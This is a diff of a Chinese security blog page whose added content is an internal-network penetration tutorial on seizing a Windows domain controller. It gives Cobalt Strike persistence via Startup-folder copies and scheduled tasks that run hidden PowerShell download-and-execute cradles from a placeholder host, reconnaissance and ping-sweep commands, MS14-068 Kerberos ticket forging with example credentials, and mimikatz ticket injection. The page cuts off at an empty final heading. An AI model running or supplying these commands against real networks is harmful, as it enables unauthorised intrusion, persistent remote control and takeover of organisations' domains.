@@ -5,7 +5,7 @@
 <head>
     <!-- hexo-inject:begin --><!-- hexo-inject:end --><meta charset="utf-8">
     <meta name="keywords" content="内网渗透专题（五）, HTML,CSS,JavaScript,JQuery,java,linux等">
-    <meta name="description" content="内网渗透比较系统的讲解">
+    <meta name="description" content="一些综合性问题">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -454,21 +454,21 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
-                    2022-04-16
+                    2022-05-17
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    0
+                    1.1k
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    1 分
+                    4 分
                 </div>
                 
 
@@ -486,7 +486,116 @@
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                
+                <h1 id="如何拿到域控？"><a href="#如何拿到域控？" class="headerlink" title="如何拿到域控？"></a>如何拿到域控？</h1><h3 id="外网打点"><a href="#外网打点" class="headerlink" title="外网打点"></a>外网打点</h3><p>信息收集，拿到可用的exp，蚁剑连接到木马，上传CS木马。</p>
+<h3 id="权限维持"><a href="#权限维持" class="headerlink" title="权限维持"></a>权限维持</h3><p>CS连接到木马，设置延迟时间（为2秒最佳）。进程迁移，浏览进程列表选择需要注入的进程，一般为常见进程（不容易关闭）。</p>
+<h3 id="或者将木马文件放置放到启动项文件夹内"><a href="#或者将木马文件放置放到启动项文件夹内" class="headerlink" title="或者将木马文件放置放到启动项文件夹内"></a>或者将木马文件放置放到启动项文件夹内</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">shell copy <span class="token string">"123.exe"</span> "C:<span class="token punctuation">\</span>ProgramData<span class="token punctuation">\</span>Microsoft<span class="token punctuation">\</span>Windows<span class="token punctuation">\</span>Start Menu<span class="token punctuation">\</span>Programs<span class="token punctuation">\</span>StartUp<span class="token punctuation">\</span>"<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<h3 id="或者设置为计划任务"><a href="#或者设置为计划任务" class="headerlink" title="或者设置为计划任务"></a>或者设置为计划任务</h3><p>生成powershell上线语句</p>
+<img src="20211124140336-42eee5b2-4cec-1.png" style="zoom:50%;">
+
+<p>beacon上输入：</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">powershell.exe -nop -w hidden -c <span class="token string">"IEX <span class="token variable"><span class="token punctuation">((</span>new<span class="token operator">-</span>object net.webclient<span class="token punctuation">)</span>.downloadstring<span class="token punctuation">(</span>'http<span class="token operator">:</span><span class="token operator">/</span><span class="token operator">/</span>xx.xx.xx.xx<span class="token operator">:</span><span class="token number">10081</span><span class="token operator">/</span>a'<span class="token punctuation">))</span></span>"</span> <span class="token comment"># 你设置的Local host</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>设置计划任务(每隔一个小时，以system权限执行命令)</p>
+<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token comment"># 其他启动时间参数：</span>
+/sc onlogon  <span class="token comment"># 用户登录时启动</span>
+/sc onstart  <span class="token comment"># 系统启动时启动</span>
+/sc onidle   <span class="token comment"># 系统空闲时启动</span>
+
+shell schtasks /create /tn win /sc HOURLY /mo <span class="token number">1</span> /tr <span class="token string">"powershell.exe -nop -w hidden -c 'IEX <span class="token variable"><span class="token punctuation">((</span>new<span class="token operator">-</span>object net.webclient<span class="token punctuation">)</span>.downloadstring<span class="token punctuation">(</span>'http<span class="token operator">:</span><span class="token operator">/</span><span class="token operator">/</span>xx.xx.xx.xx<span class="token operator">:</span><span class="token number">10081</span><span class="token operator">/</span>a'<span class="token punctuation">))</span></span>'"</span> /ru system /f<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>启动计划任务</p>
+<p>设置计划任务(用户登录时启动)</p>
+<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">shell schtasks /create /tn win1 /tr <span class="token string">"powershell.exe -nop -w hidden -c 'IEX <span class="token variable"><span class="token punctuation">((</span>new<span class="token operator">-</span>object net.webclient<span class="token punctuation">)</span>.downloadstring<span class="token punctuation">(</span>'http<span class="token operator">:</span><span class="token operator">/</span><span class="token operator">/</span>xx.xx.xx.xx<span class="token operator">:</span><span class="token number">10081</span><span class="token operator">/</span>a'<span class="token punctuation">))</span></span>'"</span> /sc ONLOGON
+
+
+shell schtasks /create /sc MINUTE /mo <span class="token number">1</span> /tn win2 /tr <span class="token string">"powershell.exe -nop -w hidden -c <span class="token entity" title="\&quot;">\"</span>IEX <span class="token variable"><span class="token punctuation">((</span>new<span class="token operator">-</span>object net.webclient<span class="token punctuation">)</span>.downloadstring<span class="token punctuation">(</span>'http<span class="token operator">:</span><span class="token operator">/</span><span class="token operator">/</span>xx.xx.xx.xx<span class="token operator">:</span><span class="token number">10081</span><span class="token operator">/</span>a'<span class="token punctuation">))</span></span><span class="token entity" title="\&quot;">\"</span>"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>删除计划任务</p>
+<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">shell schtasks /delete /tn win2 /f<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>同样的，不仅仅可以放powershell语句，放木马文件路径也是一样的。</p>
+<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">shell schtasks /create /tn win /sc HOURLY /mo <span class="token number">1</span> /tr <span class="token string">"C:\Windows\Temp<span class="token entity" title="\123">\123</span>.exe"</span> /ru system /f<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<h3 id="主机信息收集"><a href="#主机信息收集" class="headerlink" title="主机信息收集"></a>主机信息收集</h3><p>在CS的beacon输shell进行信息收集，定位到域内服务器的IP。</p>
+<p>基本的信息收集，具体可以看内网渗透（二）</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># 主机信息</span>
+systeminfo
+
+<span class="token comment"># 网络信息</span>
+ipconfig /all
+
+<span class="token comment"># 路由表</span>
+arp -a
+
+<span class="token comment"># 进程，查AV</span>
+tasklist
+
+<span class="token comment"># 端口占用情况</span>
+<span class="token function">netstat</span> -ano
+
+<span class="token comment"># 是否域环境</span>
+net user /domain
+
+<span class="token comment"># 是否出网</span>
+<span class="token function">ping</span> baidu.com -n <span class="token number">2</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h3 id="隧道搭建"><a href="#隧道搭建" class="headerlink" title="隧道搭建"></a>隧道搭建</h3><p>设置proxifier指向服务器，利用隧道访问到域内服务器。</p>
+<p>详情看内网渗透（四）</p>
+<h3 id="横向移动"><a href="#横向移动" class="headerlink" title="横向移动"></a>横向移动</h3><p>给内网服务器挂马。蚁剑连接，新建一个用户。可能权限不足，可以提权。详情可以看提权篇。</p>
+<h3 id="域内信息收集"><a href="#域内信息收集" class="headerlink" title="域内信息收集"></a>域内信息收集</h3><p>基本信息收集</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># 查看当前登陆域</span>
+net config workstation
+
+<span class="token comment"># 查询域用户</span>
+net user /domain
+
+<span class="token comment"># 查询指定域用户详细信息</span>
+net user xxx /domain   
+
+<span class="token comment"># 查询域控制器</span>
+net <span class="token function">time</span> /domain
+
+<span class="token comment"># 获取域内用户详细信息</span>
+wmic useraccount get /all
+
+<span class="token comment"># 查询域控制器主机名</span>
+nltest /DCLIST:god<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h4 id="定位域控制器"><a href="#定位域控制器" class="headerlink" title="定位域控制器"></a>定位域控制器</h4><p>基于ping主域来获取</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">ping</span> xxx.cool -n <span class="token number">2</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>查询dns服务器</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">ipconfig /all<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>查询dns解析记录</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">nslookup</span> -type<span class="token operator">=</span>all _ldap._tcp.dc._msdcs.<span class="token operator">&lt;</span>域名<span class="token operator">&gt;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<h4 id="存活主机探测"><a href="#存活主机探测" class="headerlink" title="存活主机探测"></a>存活主机探测</h4><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># 执行命令扫描当前主机所在C段</span>
+nbtscan-1.0.35.exe <span class="token number">192.168</span>.30.0/24
+<span class="token comment"># ping命令</span>
+<span class="token keyword">for</span> /l %i <span class="token keyword">in</span> <span class="token punctuation">(</span><span class="token number">1,1</span>,255<span class="token punctuation">)</span> <span class="token keyword">do</span> @ <span class="token function">ping</span> <span class="token number">192.168</span>.30.%i -w <span class="token number">1</span> -n <span class="token number">1</span><span class="token operator">|</span><span class="token function">find</span> /i <span class="token string">"ttl="</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h3 id="横向移动-1"><a href="#横向移动-1" class="headerlink" title="横向移动"></a>横向移动</h3><p>PC+计划任务，at命令，PC+Windows服务，psexec，hash传递。</p>
+<h3 id="票据传递"><a href="#票据传递" class="headerlink" title="票据传递"></a>票据传递</h3><p>使用MS14-068，将普通用户提升至域控权限。</p>
+<p>下载地址：<br><a target="_blank" rel="noopener" href="https://github.com/Al1ex/WindowsElevation/tree/master/CVE-2014-6324">https://github.com/Al1ex/WindowsElevation/tree/master/CVE-2014-6324</a></p>
+<p>首先获取一个域用户的权限</p>
+<p>需要条件：</p>
+<pre class="line-numbers language-none"><code class="language-none">域内普通用户SID
+域内普通用户密码<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<p>上传ms14-068.exe。并执行下面的命令，生成票据文件。</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">ms14-068.exe -u 域成员名@域名 -s 域成员sid -d 域控制器ip地址 -p 域成员密码
+<span class="token comment"># example：</span>
+ms14-068.exe -u web@xxx.cool -s S-1-5-21-3296092892-1320626564-2720975204-1105 -d <span class="token number">192.168</span>.30.128 -p <span class="token number">1234</span>,abcd<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
+<p>将票据注入到内存中，使用mimikatz</p>
+<pre class="line-numbers language-none"><code class="language-none">kerberos::purge                      //清空当前机器中所有凭证，如果有域成员凭证会影响凭证伪造
+kerberos::list                       //查看当前机器凭证
+kerberos::ptc TGT_xxx@domain.cache   //将票据注入到内存中<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
+<p>还有就是黄金，白银票据传递。</p>
+<h1 id="横向渗透，纵向渗透"><a href="#横向渗透，纵向渗透" class="headerlink" title="横向渗透，纵向渗透"></a>横向渗透，纵向渗透</h1><h2 id="横向移动-2"><a href="#横向移动-2" class="headerlink" title="横向移动"></a>横向移动</h2><p>在内网渗透中，当攻击者获取到内网某台机器的控制权后，会以被攻陷的主机为跳板，通过收集域内凭证等各种方法，访问域内其他机器，进一步扩大资产范围。通过此类手段，攻击者最终可能获得域控制器的访问权限，甚至完全控制基于Windows操作系统的整个内网环境，控制域环境下的全部机器。</p>
+<h1 id="黄金票据与白银票据区别？"><a href="#黄金票据与白银票据区别？" class="headerlink" title="黄金票据与白银票据区别？"></a>黄金票据与白银票据区别？</h1>
                 
             </div>
             <hr/>
@@ -1007,7 +1116,7 @@
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            内网渗透比较系统的讲解
+                            浅析内网端口转发和隧道代理
                         
                     </div>
                     <div class="publish-info">
